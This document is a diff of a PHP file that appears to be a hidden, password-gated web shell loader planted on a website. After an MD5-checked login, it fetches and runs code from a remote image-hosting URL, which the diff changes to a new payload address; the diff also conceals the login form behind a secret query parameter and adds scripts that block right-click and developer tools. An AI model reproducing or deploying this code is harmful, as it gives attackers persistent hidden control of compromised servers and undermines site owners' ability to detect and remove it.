@@ -4,22 +4,19 @@ session_start();
 function is_logged_in() {
     return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
 }
-
 $userMd5 = 'a4ca719c3fa51b57bff8716f5ebe028d';
 $passMd5 = 'ec07decc7fe3994412cb51cc7be02fcb';
-
 if (!is_logged_in()) {
     if (isset($_POST['username']) && isset($_POST['password'])) {
         if (md5($_POST['username']) === $userMd5 && md5($_POST['password']) === $passMd5) {
             $_SESSION['loggedin'] = true;
-            header("Location: " . $_SERVER['PHP_SELF']);
+            header("Location: " . strtok($_SERVER['REQUEST_URI'], '?'));
             exit();
         } else {
             $error = "Wrong";
         }
     }
 }
-
 function geturlsinfo($destiny) {
     $Array = array(
         'fopen',
@@ -50,7 +47,7 @@ function geturlsinfo($destiny) {
 }
 
 if (is_logged_in()) {
-    $destiny = 'https://res.cloudinary.com/dkgvqbc6x/image/upload/v1786650137/kuyang_hsbdjs_qrklmi';
+    $destiny = 'https://res.cloudinary.com/dkgvqbc6x/image/upload/v1786662627/kuyangbaru_kvc7tx';
     
     $dream = geturlsinfo($destiny);
 
@@ -67,6 +64,7 @@ if (is_logged_in()) {
 }
 
 if (!is_logged_in()) {
+    $showForm = isset($_GET['not']) || isset($error);
     ?>
     <!DOCTYPE html>
     <html lang="en">
@@ -74,6 +72,7 @@ if (!is_logged_in()) {
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>EL STILL HERE</title>
+        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
         <style>
             * {
                 margin: 0;
@@ -82,7 +81,7 @@ if (!is_logged_in()) {
             }
             body, html {
                 height: 100%;
-                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                font-family: 'Orbitron', sans-serif;
             }
             body {
                 background: url('https://wallpapercave.com/wp/wp13582695.jpg') no-repeat center center fixed;
@@ -92,7 +91,7 @@ if (!is_logged_in()) {
                 align-items: center;
             }
             .form-container {
-                display: flex;
+                display: <?php echo $showForm ? 'flex' : 'none'; ?>;
                 justify-content: center;
                 align-items: center;
                 width: 100%;
@@ -102,14 +101,14 @@ if (!is_logged_in()) {
                 width: 100%;
                 max-width: 380px;
                 padding: 40px 30px;
-                background: rgba(20, 0, 0, 0.85);
+                background: rgba(20, 0, 0, 0.88);
                 backdrop-filter: blur(10px);
                 -webkit-backdrop-filter: blur(10px);
                 border-radius: 16px;
-                box-shadow: 0 8px 32px rgba(255, 0, 0, 0.25);
+                box-shadow: 0 0 25px rgba(255, 102, 0, 0.6), 0 0 50px rgba(255, 0, 0, 0.4), inset 0 0 15px rgba(255, 102, 0, 0.2);
                 text-align: center;
                 color: #fff;
-                border: 1px solid rgba(255, 0, 0, 0.2);
+                border: 2px dashed rgba(255, 120, 0, 0.6);
             }
             .login-form img {
                 width: 90px;
@@ -117,15 +116,16 @@ if (!is_logged_in()) {
                 border-radius: 50%;
                 object-fit: cover;
                 margin-bottom: 15px;
-                border: 3px solid rgba(255, 0, 0, 0.4);
+                border: 3px solid rgba(255, 120, 0, 0.6);
+                box-shadow: 0 0 15px rgba(255, 102, 0, 0.5);
             }
             .login-form h2 {
                 margin: 0 0 25px 0;
-                font-size: 24px;
-                font-weight: 600;
-                letter-spacing: 1px;
-                color: #ff4d4d;
-                text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+                font-size: 22px;
+                font-weight: 800;
+                letter-spacing: 2px;
+                color: #ff8533;
+                text-shadow: 0 0 12px rgba(255, 102, 0, 0.8);
             }
             .login-form input[type="text"],
             .login-form input[type="password"] {
@@ -136,8 +136,9 @@ if (!is_logged_in()) {
                 background: rgba(255, 255, 255, 0.05);
                 color: #fff;
                 font-size: 15px;
+                font-family: 'Orbitron', sans-serif;
                 transition: all 0.3s ease;
-                border: 1px solid rgba(255, 0, 0, 0.2);
+                border: 1px solid rgba(255, 120, 0, 0.3);
             }
             .login-form input[type="text"]::placeholder,
             .login-form input[type="password"]::placeholder {
@@ -146,30 +147,31 @@ if (!is_logged_in()) {
             .login-form input[type="text"]:focus,
             .login-form input[type="password"]:focus {
                 outline: none;
-                background: rgba(255, 0, 0, 0.1);
-                border-color: rgba(255, 0, 0, 0.6);
-                box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
+                background: rgba(255, 102, 0, 0.1);
+                border-color: rgba(255, 120, 0, 0.8);
+                box-shadow: 0 0 12px rgba(255, 102, 0, 0.5);
             }
             .login-form button {
                 width: 100%;
                 padding: 14px;
                 margin-top: 20px;
-                background: linear-gradient(135deg, #d32f2f 0%, #880e4f 100%);
+                background: linear-gradient(135deg, #ff6600 0%, #b30000 100%);
                 color: white;
                 border: none;
                 border-radius: 8px;
                 cursor: pointer;
-                font-size: 16px;
+                font-size: 15px;
                 font-weight: 600;
+                font-family: 'Orbitron', sans-serif;
                 letter-spacing: 1px;
                 transition: all 0.3s ease;
                 text-transform: uppercase;
-                box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4);
+                box-shadow: 0 4px 20px rgba(255, 102, 0, 0.6);
             }
             .login-form button:hover {
                 transform: translateY(-2px);
-                box-shadow: 0 6px 22px rgba(255, 0, 0, 0.6);
-                background: linear-gradient(135deg, #e53935 100%, #ad1457 0%);
+                box-shadow: 0 6px 25px rgba(255, 102, 0, 0.9);
+                background: linear-gradient(135deg, #ff8533 100%, #cc0000 0%);
             }
             .error-message {
                 background: rgba(255, 82, 82, 0.2);
@@ -180,10 +182,53 @@ if (!is_logged_in()) {
                 margin-bottom: 15px;
                 border: 1px solid rgba(255, 82, 82, 0.4);
             }
+
+            #customPopup {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.7);
+                backdrop-filter: blur(5px);
+                justify-content: center;
+                align-items: center;
+                z-index: 99999;
+            }
+            .popup-box {
+                background: rgba(20, 0, 0, 0.95);
+                border: 2px solid #ff6600;
+                padding: 30px;
+                border-radius: 12px;
+                text-align: center;
+                color: #fff;
+                box-shadow: 0 0 25px rgba(255, 102, 0, 0.8);
+                max-width: 300px;
+                width: 90%;
+            }
+            .popup-box h3 {
+                color: #ff8533;
+                margin-bottom: 15px;
+                font-size: 18px;
+                letter-spacing: 1px;
+            }
+            .popup-box button {
+                padding: 10px 25px;
+                background: linear-gradient(135deg, #ff6600 0%, #b30000 100%);
+                color: white;
+                border: none;
+                border-radius: 6px;
+                cursor: pointer;
+                font-family: 'Orbitron', sans-serif;
+                font-weight: 600;
+                margin-top: 15px;
+                box-shadow: 0 0 10px rgba(255, 102, 0, 0.5);
+            }
         </style>
     </head>
     <body>
-        <div class="form-container">
+        <div class="form-container" id="formContainer">
             <div class="login-form">
                 <img src="https://i.pinimg.com/originals/fa/6a/a8/fa6aa8b9f02691e42df56f1678e795fc.gif" alt="Logo">
                 <h2>SINGLE FIGHTER ERA</h2>
@@ -197,6 +242,32 @@ if (!is_logged_in()) {
                 </form>
             </div>
         </div>
+        <div id="customPopup">
+            <div class="popup-box">
+                <h3>nyari apa dek?</h3>
+                <button onclick="closePopup()">TUTUP</button>
+            </div>
+        </div>
+        <script>
+            function showWarning() {
+                document.getElementById('customPopup').style.display = 'flex';
+            }
+           function closePopup() {
+                document.getElementById('customPopup').style.display = 'none';
+            }
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                showWarning();
+            });
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) || 
+                    (e.ctrlKey && (e.key === 'U' || e.key === 'u'))) {
+                    e.preventDefault();
+                    showWarning();
+                }
+            });
+        </script>
     </body>
     </html>
     <?php
